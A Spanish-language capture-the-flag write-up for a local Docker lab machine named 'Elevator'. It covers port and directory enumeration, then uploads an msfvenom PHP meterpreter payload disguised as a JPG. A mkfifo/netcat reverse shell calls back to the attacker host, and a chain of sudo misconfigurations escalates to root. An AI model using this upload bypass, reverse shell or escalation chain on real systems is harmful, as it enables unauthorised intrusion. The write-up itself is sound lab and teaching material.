# ELEVATOR  

> Dificultad: Fácil  									

____

Preparación de Docker:  

```
unzip -l <ZIP>  
unzip <ZIP>  
rm -f <script.sh>  
sudo docker load -i <TAR>  
sudo docker run (...) -p 9090:80 <imagen>
```  
La última línea mapea el puerto del contenedor al 9090 de localhost, para poder trabajar cómodamente desde el navegador.  
> IP Kali atacante --> 172.18.0.3  
> IP Elevator --> 172.18.0.2  

___  

#### FASE ENUMERACIÓN / RECOPILACIÓN:

Primero comenzamos con el Escaneo del objetivo (puertos, servicios y versiones). Para ello, utilicé la herramienta nmap:  

`nmap -n -v -sV -sC --min-rate 5000 --open 172.18.0.2`  

El reporte sólo muestra el puerto 80 abierto, lo que indica que se trata de una web app.  
	
Luego proseguimos con la Enumeración de Directorios Web. Para esto utilicé la herramienta wfuzz:  

`wfuzz -c --hc 404 -t 200 -z file,<diccionario> -u "http://172.18.0.2/FUZZ/"`

Encontró 3 directorios interesantes (301 y 200):  

> /javascript		    301  
> /themes		        301  
> /server-status	    403  
> /themes/uploads/	 	200  	

Nos interesan los 301 y 200, porque son redirecciones y consultas válidas, respectivamente. El 403 significa "Sin Autorización".  
Una vez aclarado que no hay más dirs por encontrar, me enfoqué en la búsqueda de recursos (URI):  

`wfuzz -c --hc 404,403 --hw 0 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://172.18.0.2/themes/FUZZ.FUZ2Z"`  

> /index.html		      200  
> /themes/upload.php	  200  
> /themes/archivo.html    200  

____
		
#### FASE EXPLOTACIÓN:  

Al acceder a la URI /themes/archivo.html, vemos que se trata de un formulario de subida. Por lo visto, sólo acepta imágenes JPG o JPEG, entonces debemos pensar en subir nuestra web-shell en una imagen. En mi caso, creé el código PHP con msfvenom:  

`msfvenom -p php/meterpreter/reverse_tcp LHOST=172.18.0.3 LPORT=6660 R -o webshell.php`  

Usé ImageMagick para crear una nueva imagen 1x1 para poder subir:  

`sudo apt install imagemagick -y`

`convert -size 1x1 xc:red img-inicial.jpg`  

Ahora, concatenamos el código de la web shell a la imagen:

`cat img-inicial.jpg webshell.php > webshell.php.jpg`  

Resumiendo: dejamos la extensión JPG para poder subir el fichero y PHP para que el servidor pueda correr la webshell.  

Vamos al navegador a /themes/archivo.html y la subimos:  

[IMG]  

El navegador devuelve la URI de la imagen maliciosa. En mi caso: http://localhost:9090/themes/uploads/6912508f2631b.jpg  

Ahora preparamos el listener con Meterpreter:  

> msfconsole
> use exploit/multi/handler
> set payload /php/meterpreter/reverse_tcp
> set lhost 172.18.0.3
> set lport 6660
> exploit (o run)

Una vez preparado el listener, corremos la webshell y conecta!  

[IMG]  

Desde Meterpreter corremos `getuid` y somos `www-data`. O tambien:  

```
shell
whoami
```

En este punto debemos correr una Reverse Shell para tener más control y trabajar mejor. Usé una RS one-liner bajo el standard POSIX, el cual es universal en entornos Linux:    

```
nc -lvnp 7770 # Local
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.3 7700 > /tmp/f # Remoto
```

Al conseguir conectividad, primero hay que mejorar la TTY:

`which python python3`

Al ver que no hay ningún intérprete de Python instalado, probamos tipo POSIX:  

```
script /dev/null -c bash
CTRL+z
stty raw -echo;fg
reset xterm
export TERM=xterm
```

Ahora nuestro entorno de trabajo está mejorado.  

____  

#### FASE POST-EXPLOTACIÓN (Escalar Privilegios):  

Una vez ya tenemos un pie dentro del sistema, hay que enumerar usuarios para escalar:

`cat /etc/passwd`  

Encontramos a:  
* daphne  
* vilma  
* shaggy  
* fred  
* scooby  

Una vez tenemos los usuarios podemos buscar Privilegios Sudo, por ejemplo. Siendo www-data, corremos `sudo -l` y todo lo que sigue es consultar la página https://gtfobins.github.io/ y de manera anidada vamos resolviendo usando Explotación SUDO hasta conseguir root:

```
sudo -l
	ALL=(daphne) NOPASSWD: /usr/bin/env
		sudo -u daphne env /bin/sh
			whoami = daphne
			sudo -l
				(vilma) NOPASSWD: /usr/bin/ash
			sudo -u vilma /usr/bin/ash
				whoami = vilma
				sudo -l
					(shaggy) NOPASSWD: /usr/bin/ruby
				sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
					whoami = shaggy
					sudo -l
						(fred) NOPASSWD: /usr/bin/lua
					sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
						whoami = fred
							sudo -l
								(scooby) NOPASSWD: /usr/bin/gcc
							sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .
								whoami = scooby
								sudo -l
									(root) NOPASSWD: /usr/bin/sudo
								sudo /usr/bin/sudo /bin/sh
									whoami = root
```

Y eso es todo.
